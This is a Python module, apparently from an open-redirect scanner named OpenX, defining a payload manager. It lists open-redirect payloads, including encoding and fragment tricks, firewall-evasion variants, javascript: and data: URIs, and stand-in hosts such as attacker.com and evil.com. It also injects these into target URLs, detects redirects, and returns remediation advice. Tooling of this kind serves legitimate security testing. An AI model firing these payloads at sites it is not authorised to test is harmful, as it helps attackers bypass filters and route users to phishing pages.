#!/usr/bin/env python3
"""
Payload Manager for OpenX
Handles payload generation, customization, and detection
"""
import re
import os
import json
import logging
import urllib.parse
from pathlib import Path

class PayloadManager:
    """Manages payloads for open redirect testing"""
    
    def __init__(self, config=None):
        """
        Initialize the payload manager
        
        Args:
            config (dict, optional): Configuration dictionary
        """
        self.config = config or {}
        self.target_domains = self.config.get('target_domains', ['example.com'])
        
        # Default payloads
        self.common_payloads = [
            "https://{target_domain}/", "//{target_domain}/", "/\\{target_domain}/", 
            "/https://{target_domain}/", "/%5c{target_domain}/", "/%5chttps://{target_domain}/", 
            "/%252f{target_domain}/", "/%252fhttps://{target_domain}/", "//{target_domain}/", 
            "/./https://{target_domain}/", "/..//{target_domain}/", "///{target_domain}/",
            "/?next=https://{target_domain}/", "/?url=https://{target_domain}/", 
            "/?redirect=https://{target_domain}/", "/?redir=https://{target_domain}/", 
            "/?dest=https://{target_domain}/", "/?goto=https://{target_domain}/",
            "https://{target_domain}@attacker.com", "https://{target_domain}@attacker.com/",
            "/https://%00{target_domain}/", "/%5C/%5C{target_domain}/", 
            "//{target_domain}/%u002f%u002e%u002e", "/https://{target_domain}%23@google.com",
            "javascript://alert(1)%0a%0d//{target_domain}",
            "data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249Imh0dHBzOi8ve3RhcmdldF9kb21haW59Ijwvc2NyaXB0Pg==",
            "\\\\.{target_domain}", "javascript:window.location='{target_domain}'",
            "@{target_domain}", "\\\\{target_domain}", "{target_domain}\\\\", 
            "https://{target_domain}.attacker.com", "https://attacker.com/{target_domain}",
            "/%09/{target_domain}", "/%09https://{target_domain}/", "/%2f{target_domain}",
            "//%e2%80%ae@{target_domain}", "//%00{target_domain}",
            # Fragment-based bypass payloads
            "{target_domain}#", 
            "{target_domain}#hackxpert.com",
            "evil.com#{target_domain}",
            "https://evil.com#{target_domain}",
            "{target_domain}#https://hackxpert.com",
            "https://{target_domain}#",
            "http://{target_domain}#",
            "//{target_domain}#",
            "https://evil.com/#{target_domain}",
            "https://{target_domain}@evil.com#",
            "https://{target_domain}@evil.com#hackxpert.com",
            "{target_domain}#.evil.com",
            "{target_domain}/%23/",
            "{target_domain}\\#",
            "{target_domain}%23",
            "https://{target_domain}%23@evil.com"
        ]
        
        # Parameter-based payloads
        self.param_based_payloads = [
            "https://{target_domain}/", "//{target_domain}/", "/https://{target_domain}/", 
            "///{target_domain}/", "https://{target_domain}@attacker.com"
        ]
        
        # WAF evasion payloads
        self.waf_evasion_payloads = [
            "/%09/{target_domain}", "/%09https://{target_domain}/", 
            "/%2f{target_domain}", "//%e2%80%ae@{target_domain}", 
            "//%00{target_domain}", "/%0a{target_domain}", "/%0d{target_domain}",
            "/%07{target_domain}", "/%0c{target_domain}", "/%0b{target_domain}",
            "/%1f{target_domain}", "/%7f{target_domain}"
        ]
        
        # Path-based payloads
        self.path_based_payloads = [
            "/redirect/{target_domain}", "/login?next={target_domain}", 
            "/logout?next={target_domain}", "/auth/redirect/{target_domain}",
            "/redirect.php?url={target_domain}", "/redirect.asp?url={target_domain}",
            "/redirect.jsp?url={target_domain}", "/redirect.html?url={target_domain}",
            "/redirect.js?url={target_domain}", "/redirect.cgi?url={target_domain}"
        ]
        
        # Load custom payloads if provided
        self.custom_payloads = []
        self.load_custom_payloads()
    
    def load_custom_payloads(self, custom_payload_file=None):
        """
        Load custom payloads from a file
        
        Args:
            custom_payload_file (str, optional): Path to custom payload file
        """
        # Check for custom payload file in config
        if not custom_payload_file and self.config.get('custom_payload_file'):
            custom_payload_file = self.config.get('custom_payload_file')
        
        # If still no file specified, check default locations
        if not custom_payload_file:
            default_paths = [
                Path(__file__).parent / "custom_payloads.txt",
                Path(__file__).parent / "custom_payloads.json"
            ]
            
            for path in default_paths:
                if path.exists():
                    custom_payload_file = str(path)
                    break
        
        if custom_payload_file and os.path.exists(custom_payload_file):
            try:
                if custom_payload_file.endswith('.json'):
                    with open(custom_payload_file, 'r') as f:
                        self.custom_payloads = json.load(f)
                else:
                    with open(custom_payload_file, 'r') as f:
                        self.custom_payloads = [line.strip() for line in f if line.strip()]
                
                logging.info(f"Loaded {len(self.custom_payloads)} custom payloads from {custom_payload_file}")
            except Exception as e:
                logging.error(f"Error loading custom payloads: {e}")
    
    def get_all_payloads(self):
        """
        Get all payloads with target domains substituted
        
        Returns:
            list: All available payloads
        """
        all_payloads = []
        
        # Process each target domain
        for domain in self.target_domains:
            # Add common payloads
            all_payloads.extend([p.format(target_domain=domain) for p in self.common_payloads])
            
            # Add custom payloads
            all_payloads.extend([p.format(target_domain=domain) if '{target_domain}' in p else p 
                                for p in self.custom_payloads])
            
            # Add WAF evasion payloads if enabled
            if self.config.get('evasion', {}).get('waf_bypass', False):
                all_payloads.extend([p.format(target_domain=domain) for p in self.waf_evasion_payloads])
        
        # Remove duplicates while preserving order
        unique_payloads = []
        seen = set()
        for payload in all_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        return unique_payloads
    
    def get_param_payloads(self):
        """
        Get parameter-based payloads with target domains substituted
        
        Returns:
            list: Parameter-based payloads
        """
        param_payloads = []
        
        for domain in self.target_domains:
            param_payloads.extend([p.format(target_domain=domain) for p in self.param_based_payloads])
        
        return param_payloads
    
    def get_path_payloads(self):
        """
        Get path-based payloads with target domains substituted
        
        Returns:
            list: Path-based payloads
        """
        path_payloads = []
        
        for domain in self.target_domains:
            path_payloads.extend([p.format(target_domain=domain) for p in self.path_based_payloads])
        
        return path_payloads
    
    def inject_payload(self, target, payload, injection_type="auto"):
        """
        Inject a payload into a target URL
        
        Args:
            target (str): Target URL
            payload (str): Payload to inject
            injection_type (str): Type of injection (auto, query, path, fragment)
            
        Returns:
            str: URL with injected payload
        """
        parsed_url = urllib.parse.urlparse(target)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Check for FUZZ placeholder
        if "FUZZ" in target:
            return target.replace("FUZZ", payload)
        
        # Auto-detect injection type if not specified
        if injection_type == "auto":
            if query_params:
                injection_type = "query"
            else:
                injection_type = "query"  # Default to query if no better option
        
        # Inject based on type
        if injection_type == "query":
            # Check for redirect-related parameters
            redirect_param_found = False
            for param in query_params:
                if any(keyword in param.lower() for keyword in ["redirect", "url", "next", "dest", "goto", "return", "target", "link", "site"]):
                    query_params[param] = [payload]
                    redirect_param_found = True
                    break
            
            # If no redirect parameter found, add one
            if not redirect_param_found:
                query_params["redirect"] = [payload]
            
            query = urllib.parse.urlencode(query_params, doseq=True)
            return urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                           parsed_url.params, query, parsed_url.fragment))
        
        elif injection_type == "path":
            # Add payload to path
            new_path = os.path.join(parsed_url.path, payload)
            return urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, new_path, 
                                           parsed_url.params, parsed_url.query, parsed_url.fragment))
        
        elif injection_type == "fragment":
            # Add payload to fragment
            return urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                           parsed_url.params, parsed_url.query, payload))
        
        else:
            # Default to adding as a query parameter
            return target + ("&" if "?" in target else "?") + "redirect=" + urllib.parse.quote(payload)
    
    def is_vulnerable(self, response_url, response_body=None):
        """
        Check if a response indicates a vulnerability
        
        Args:
            response_url (str): Final URL after redirection
            response_body (str, optional): Response body content
            
        Returns:
            tuple: (is_vulnerable, severity, details)
        """
        parsed_url = urllib.parse.urlparse(response_url)
        
        # Check if redirected to any of our target domains
        for domain in self.target_domains:
            # Direct domain match
            if domain in parsed_url.netloc:
                return True, "high", f"Redirected to target domain: {domain}"
            
            # Check for subdomain
            if parsed_url.netloc.endswith(f".{domain}"):
                return True, "medium", f"Redirected to subdomain of target domain: {parsed_url.netloc}"
        
        # Check response body for JS-based redirects if provided
        if response_body:
            # Look for JavaScript redirects
            js_redirect_patterns = [
                r"window\.location\s*=\s*['\"]https?://([^'\"]+)['\"]",
                r"document\.location\s*=\s*['\"]https?://([^'\"]+)['\"]",
                r"location\.href\s*=\s*['\"]https?://([^'\"]+)['\"]",
                r"location\.replace\s*\(\s*['\"]https?://([^'\"]+)['\"]",
                r"location\.assign\s*\(\s*['\"]https?://([^'\"]+)['\"]",
                r"<meta\s+http-equiv=['\"]refresh['\"][^>]*content=['\"][^'\"]*url=https?://([^'\"]+)['\"]",
                r"<meta\s+http-equiv=['\"]refresh['\"][^>]*content=['\"][^'\"]*https?://([^'\"]+)['\"]"
            ]
            
            for pattern in js_redirect_patterns:
                matches = re.findall(pattern, response_body, re.IGNORECASE)
                for match in matches:
                    for domain in self.target_domains:
                        if domain in match:
                            return True, "medium", f"JavaScript redirect to target domain found: {domain}"
        
        return False, "none", "No vulnerability detected"
    
    def get_remediation_advice(self, severity):
        """
        Get remediation advice based on severity
        
        Args:
            severity (str): Vulnerability severity
            
        Returns:
            str: Remediation advice
        """
        if severity == "high":
            return """
            <h3>Remediation for High Severity Open Redirect</h3>
            <ul>
                <li>Implement a whitelist of allowed redirect URLs</li>
                <li>Use relative URLs for internal redirects</li>
                <li>Validate the full URL including protocol and domain</li>
                <li>Consider using indirect reference maps instead of direct URLs</li>
                <li>Implement CSRF protection for all redirect functionality</li>
            </ul>
            """
        elif severity == "medium":
            return """
            <h3>Remediation for Medium Severity Open Redirect</h3>
            <ul>
                <li>Validate redirect URLs against a whitelist</li>
                <li>Ensure proper URL validation includes checking the domain</li>
                <li>Consider implementing URL signing for redirects</li>
                <li>Add warnings to users when redirecting to external sites</li>
            </ul>
            """
        elif severity == "low":
            return """
            <h3>Remediation for Low Severity Open Redirect</h3>
            <ul>
                <li>Add user confirmation for external redirects</li>
                <li>Implement proper URL validation</li>
                <li>Consider using a redirect warning page</li>
            </ul>
            """
        else:
            return "No remediation needed."
